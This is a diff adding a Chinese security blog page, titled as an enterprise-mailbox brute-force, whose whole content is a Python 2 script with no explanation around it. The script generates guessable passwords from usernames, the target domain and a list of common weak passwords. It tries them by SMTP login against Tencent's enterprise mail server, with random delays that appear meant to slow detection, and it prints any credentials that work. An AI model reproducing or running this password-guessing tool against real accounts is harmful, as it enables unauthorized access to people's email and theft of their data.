@@ -1,0 +1,371 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>某企业邮箱爆破 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python
+# coding: utf-8
+
+import smtplib
+import random
+import time
+import sys
+
+
+def tencent(user, password):
+	time.sleep(random.uniform(2, 6))
+	smtp_server &amp;#x3D; &amp;quot;smtp.exmail.qq.com&amp;quot;
+	smtp_port &amp;#x3D; 587
+	server &amp;#x3D; smtplib.SMTP(smtp_server, smtp_port)
+	server.starttls()
+	try:
+		server.login(user, password)
+		print &amp;#39;[+]----------auth success------%s&amp;#39; % password
+	except smtplib.SMTPAuthenticationError as e:
+		print &amp;#39;[+] Auth Fail %s: %s&amp;#39; % (user, password)
+
+
+def genpasswd(user, suffix):
+	domain &amp;#x3D; suffix.split(&amp;#39;.&amp;#39;)[0]
+	password &amp;#x3D; []
+	password.append(domain + &amp;#39;@123&amp;#39;)
+	password.append(domain + &amp;#39;@1234&amp;#39;)
+	name &amp;#x3D; user.split(&amp;#39;@&amp;#39;)[0]
+	wake_value&amp;#x3D;[&amp;#39;!@#$%^1qazxsw2 &amp;#39;, &amp;#39;admin!@#&amp;#39;, &amp;#39;Abc123&amp;#39;, &amp;#39;123456aa~&amp;#39;, &amp;#39;qazwsx123&amp;#39;, &amp;#39;1qaz2wsx&amp;#39;, &amp;#39;asd123456&amp;#39;, &amp;#39;123456a~&amp;#39;, &amp;#39;Asdf1234&amp;#39;, &amp;#39;Qwer1234&amp;#39;, &amp;#39;Abcd1234&amp;#39;, &amp;#39;a123456&amp;#39;, &amp;#39;123456a&amp;#39;, name[0].upper()+name[1:]+&amp;#39;123&amp;#39;, name+&amp;#39;123&amp;#39;, name+&amp;#39;1234&amp;#39;,name+&amp;#39;@2016&amp;#39;, name+&amp;#39;@2017&amp;#39;]
+	password.extend(wake_value)
+	return password
+
+
+def genusers(userfiles, suffix):
+	users &amp;#x3D; []
+	with open(userfiles, &amp;#39;rb&amp;#39;) as f:
+		while 1:
+			user &amp;#x3D; f.readline().strip()
+			if user &amp;#x3D;&amp;#x3D; &amp;#39;&amp;#39;:
+				break
+			users.append(user + &amp;#39;@&amp;#39; + suffix)
+		return users
+
+if __name__ &amp;#x3D;&amp;#x3D; &amp;quot;__main__&amp;quot;:
+	if len(sys.argv) !&amp;#x3D; 3:
+		print &amp;#39;Usage: %s userfile domain&amp;#39; % sys.argv[0]
+		print &amp;#39;%s users.txt baidu.com&amp;#39; % sys.argv[0]
+		exit(0)
+	userfile &amp;#x3D; sys.argv[1]
+	suffix &amp;#x3D; sys.argv[2]
+	for user in genusers(userfile, suffix):
+		for password in genpasswd(user, suffix):
+			tencent(user, password)"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="某企业邮箱爆破"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 某企业邮箱爆破</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+# coding: utf-8
+
+import smtplib
+import random
+import time
+import sys
+
+
+def tencent(user, password):
+	time.sleep(random.uniform(2, 6))
+	smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;
+	smtp_port &#x3D; 587
+	server &#x3D; smtplib.SMTP(smtp_server, smtp_port)
+	server.starttls()
+	try:
+		server.login(user, password)
+		print &#39;[+]----------auth success------%s&#39; % password
+	except smtplib.SMTPAuthenticationError as e:
+		print &#39;[+] Auth Fail %s: %s&#39; % (user, password)
+
+
+def genpasswd(user, suffix):
+	domain &#x3D; suffix.split(&#39;.&#39;)[0]
+	password &#x3D; []
+	password.append(domain + &#39;@123&#39;)
+	password.append(domain + &#39;@1234&#39;)
+	name &#x3D; user.split(&#39;@&#39;)[0]
+	wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]
+	password.extend(wake_value)
+	return password
+
+
+def genusers(userfiles, suffix):
+	users &#x3D; []
+	with open(userfiles, &#39;rb&#39;) as f:
+		while 1:
+			user &#x3D; f.readline().strip()
+			if user &#x3D;&#x3D; &#39;&#39;:
+				break
+			users.append(user + &#39;@&#39; + suffix)
+		return users
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+	if len(sys.argv) !&#x3D; 3:
+		print &#39;Usage: %s userfile domain&#39; % sys.argv[0]
+		print &#39;%s users.txt baidu.com&#39; % sys.argv[0]
+		exit(0)
+	userfile &#x3D; sys.argv[1]
+	suffix &#x3D; sys.argv[2]
+	for user in genusers(userfile, suffix):
+		for password in genpasswd(user, suffix):
+			tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/05/19/baopo-Q.html" class="leancloud-visitors view" data-flag-title="某企业邮箱爆破">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/05/23/xss-get-ip.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/04/12/xss-encode2.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-05-19 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
